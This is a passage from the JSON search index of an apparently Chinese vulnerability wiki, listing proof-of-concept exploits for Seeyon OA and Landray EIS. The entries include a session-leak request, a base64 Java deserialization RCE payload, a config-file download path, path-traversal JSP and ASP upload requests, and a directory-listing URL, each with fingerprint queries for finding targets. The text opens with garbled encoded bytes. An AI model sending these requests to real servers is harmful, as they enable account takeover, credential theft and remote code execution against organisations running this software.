A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%B","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-ajax.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cnvd-2021-01627/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-ajax.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cnvd-2021-01627/"},{"categories":null,"content":"致远OA getSessionList.jsp Session泄漏漏洞 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-getsessionlist.jsp-session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-getsessionlist.jsp-session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-getsessionlist.jsp-session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-getsessionlist.jsp-session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 未知 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-getsessionlist.jsp-session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-getsessionlist.jsp-session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"致远互联-OA\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-getsessionlist.jsp-session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-getsessionlist.jsp-session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 出现漏洞的源码 \u003c%@ page contentType=\"text/html;charset=GBK\"%\u003e \u003c%@ page session= \"false\" %\u003e \u003c%@ page import=\"net.btdz.oa.ext.https.*\"%\u003e \u003c% String reqType = request.getParameter(\"cmd\"); String outXML = \"\"; boolean allowHttps = true; if(\"allowHttps\".equalsIgnoreCase(reqType)){ //add code to judge whether it allow https or not allowHttps = FetchSessionList.checkHttps(); if (allowHttps) response.setHeader(\"AllowHttps\",\"1\"); } if(\"getAll\".equalsIgnoreCase(reqType)){ outXML = FetchSessionList.getXMLAll(); } else if(\"getSingle\".equalsIgnoreCase(reqType)){ String sessionId = request.getParameter(\"ssid\"); if(sessionId != null){ outXML = FetchSessionList.getXMLBySessionId(sessionId); } } else{ outXML += \"\u003c?xml version=\\\"1.0\\\" encoding=\\\"GB2312\\\"?\u003e\\r\\n\"; outXML += \"\u003cSessionList\u003e\\r\\n\"; // outXML += \"\u003cSession\u003e\\r\\n\"; // outXML += \"\u003c/Session\u003e\\r\\n\"; outXML += \"\u003c/SessionList\u003e\\r\\n\"; } out.println(outXML); %\u003e 从上面的代码可知，当cmd参数为getAll时，便可获取到所有用户的SessionID ,请求 /yyoa/ext/https/getSessionList.jsp?cmd=getAll 回显Session则存在漏洞 通过替换 Session即可登陆系统 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-getsessionlist.jsp-session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-getsessionlist.jsp-session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"致远OA M1Server userTokenService 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 致远OA M1Server userTokenService 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 致远OA M1Server ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"M1-Server 已启动\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 验证POC POST /esn_mobile_pns/service/userTokenService HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 804 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close cmd: @@@@@echo Test {{base64dec(rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAHQAC25ld0luc3RhbmNldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAc3EAfgATdXEAfgAYAAAAAXQAAmpzdAAPZ2V0RW5naW5lQnlOYW1ldXEAfgAbAAAAAXZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHNxAH4AE3VxAH4AGAAAAAF0LWx0cnkgewogIGxvYWQoIm5hc2hvcm46bW96aWxsYV9jb21wYXQuanMiKTsKfSBjYXRjaCAoZSkge30KZnVuY3Rpb24gZ2V0VW5zYWZlKCl7CiAgdmFyIHRoZVVuc2FmZU1ldGhvZCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5VbnNhZmUiKS5nZXREZWNsYXJlZEZpZWxkKCd0aGVVbnNhZmUnKTsKICB0aGVVbnNhZmVNZXRob2Quc2V0QWNjZXNzaWJsZSh0cnVlKTsgCiAgcmV0dXJuIHRoZVVuc2FmZU1ldGhvZC5nZXQobnVsbCk7Cn0KZnVuY3Rpb24gcmVtb3ZlQ2xhc3NDYWNoZShjbGF6eil7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGF6ekFub255bW91c0NsYXNzID0gdW5zYWZlLmRlZmluZUFub255bW91c0NsYXNzKGNsYXp6LGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKS5nZXRSZXNvdXJjZUFzU3RyZWFtKCJDbGFzcy5jbGFzcyIpLnJlYWRBbGxCeXRlcygpLG51bGwpOwogIHZhciByZWZsZWN0aW9uRGF0YUZpZWxkID0gY2xhenpBbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJyZWZsZWN0aW9uRGF0YSIpOwogIHVuc2FmZS5wdXRPYmplY3QoY2xhenosdW5zYWZlLm9iamVjdEZpZWxkT2Zmc2V0KHJlZmxlY3Rpb25EYXRhRmllbGQpLG51bGwpOwp9CmZ1bmN0aW9uIGJ5cGFzc1JlZmxlY3Rpb25GaWx0ZXIoKSB7CiAgdmFyIHJlZmxlY3Rpb25DbGFzczsKICB0cnkgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImpkay5pbnRlcm5hbC5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9IGNhdGNoIChlcnJvcikgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGFzc0J1ZmZlciA9IHJlZmxlY3Rpb25DbGFzcy5nZXRSZXNvdXJjZUFzU3RyZWFtKCJSZWZsZWN0aW9uLmNsYXNzIikucmVhZEFsbEJ5dGVzKCk7CiAgdmFyIHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcyA9IHVuc2FmZS5kZWZpbmVBbm9ueW1vdXNDbGFzcyhyZWZsZWN0aW9uQ2xhc3MsIGNsYXNzQnVmZmVyLCBudWxsKTsKICB2YXIgZmllbGRGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJmaWVsZEZpbHRlck1hcCIpOwogIHZhciBtZXRob2RGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJtZXRob2RGaWx0ZXJNYXAiKTsKICBpZiAoZmllbGRGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQoZmllbGRGaWx0ZXJNYXBGaWVsZCksIGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpLmdldENvbnN0cnVjdG9yKCkubmV3SW5zdGFuY2UoKSk7CiAgfQogIGlmIChtZXRob2RGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"致远OA webmail.do 任意文件下载 CNVD-2020-62422 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-webmail.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62422/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-webmail.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62422/"},{"categories":null,"content":"漏洞描述 致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-webmail.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62422/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-webmail.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62422/"},{"categories":null,"content":"漏洞影响 致远OA A6-V5 致远OA A8-V5 致远OA G6 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-webmail.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62422/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-webmail.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62422/"},{"categories":null,"content":"网络测绘 app=\"致远互联-OA\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-webmail.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62422/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-webmail.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62422/"},{"categories":null,"content":"漏洞复现 验证POC /seeyon/webmail.do?method=doDownloadAtt\u0026filename=test.txt\u0026filePath=../conf/datasourceCtp.properties 在漏洞的OA 系统将会下载 datasourceCtp.properties 配置文件 更改参数 filePath 可下载其他文件 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-webmail.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62422/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-webmail.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62422/"},{"categories":null,"content":"致远OA wpsAssistServlet 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 致远OA A6、A8、A8N (V8.0SP2，V8.1，V8.1SP1) 致远OA G6、G6N (V8.1、V8.1SP1) ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"致远互联-OA\" \u0026\u0026 title=\"V8.0SP2\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品主页 下载补丁220706-S004 ，对比修改的文件 主要修改的是 com.seeyon.ctp.common.wpsassist.manager.WpsAssistManagerImpl.oaSaveFile 这个方法 private Map\u003cString, Object\u003e oaSaveFile(HttpServletRequest request, Map\u003cString, Object\u003e param) throws Exception { Map\u003cString, Object\u003e result = Maps.newHashMap(); result.put(BusinessKey.OfficeTransResultFlag.getCode(), (Object)null); Long fileId = MapUtils.getLong(param, \"fileId\"); log.info(\"wpsAssist SaveFile start!fileId=\" + fileId); String newPdfFileId = MapUtils.getString(param, \"newPdfFileId\"); if (Strings.isNotBlank(newPdfFileId)) { fileId = Long.valueOf(newPdfFileId); } String realFileType = MapUtils.getString(param, \"realFileType\"); String tempFileIdPathSuffix = SystemEnvironment.getSystemTempFolder() + File.separator + fileId + realFileType; Long count = this.saveFileToPath(request, tempFileIdPathSuffix); result.put(BusinessKey.FileSize.getCode(), count); result.putAll(this.createOfficeTransCacheFile(fileId, tempFileIdPathSuffix, MapUtils.getString(param, \"canTransFileType\"))); param.put(BusinessKey.OfficeTransResultFlag.getCode(), result.get(BusinessKey.OfficeTransResultFlag.getCode())); this.copyToUploadAndTrans(param); return result; } 向上追溯调用的 oaSaveFile方法的代码 在 com.seeyon.ctp.common.wpsassist.WpsAssistServlet.doPost 中，flag参数为save时，可以调用文件上传接口 C://Seeyon/A6/base/temporary 为默认上传的位置，但 realFileType, fileId 参数可控，可以通过 ../ 遍历上传到任意目录下，验证POC POST /seeyon/wpsAssistServlet?flag=save\u0026realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp\u0026fileId=2 HTTP/1.1 Host: Content-Length: 349 Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b Accept-Encoding: gzip --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"upload\"; filename=\"123.xls\" Content-Type: application/vnd.ms-excel \u003c% out.println(\"seeyon_vuln\");%\u003e --59229605f98b8cf290a7b8908b34616b-- ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"致远OA 帆软组件 ReportServer 目录遍历漏洞 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6-reportserver-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6-reportserver-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 致远OA 帆软组件 ReportServer接口存在目录遍历漏洞，攻击者通过漏洞可以获取服务器敏感信息 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6-reportserver-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6-reportserver-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 致远OA 帆软组件 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6-reportserver-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6-reportserver-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"致远A8-V5协同管理软件 V6.1sp1\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6-reportserver-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6-reportserver-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /seeyonreport/ReportServer?op=fs_remote_design\u0026cmd=design_list_file\u0026file_path=../\u0026currentUserName=admin\u0026currentUserId=1\u0026isWebReport=true ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6-reportserver-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6-reportserver-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"蓝凌EIS 智慧协同平台 api.aspx 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Ceis-%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0-api.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Ceis-%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0-api.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 蓝凌EIS 智慧协同平台 api.aspx 文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Ceis-%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0-api.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Ceis-%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0-api.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 蓝凌EIS 智慧协同平台 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Ceis-%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0-api.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Ceis-%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0-api.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"953405444\" ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Ceis-%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0-api.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Ceis-%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0-api.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc POST /eis/service/api.aspx?action=saveImg HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0 Content-Length: 219 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynUqjgvhmkL1dxpCV Upgrade-Insecure-Requests: 1 ------WebKitFormBoundarynUqjgvhmkL1dxpCV Content-Disposition: form-data; name=\"file\"filename=\"test.asp\" Content-Type: text/html \u003c% response.write(\"Test\")%\u003e ------WebKitFormBoundarynUqjgvhmkL1dxpCV-- /files/editor_img/xxx/xxx.asp 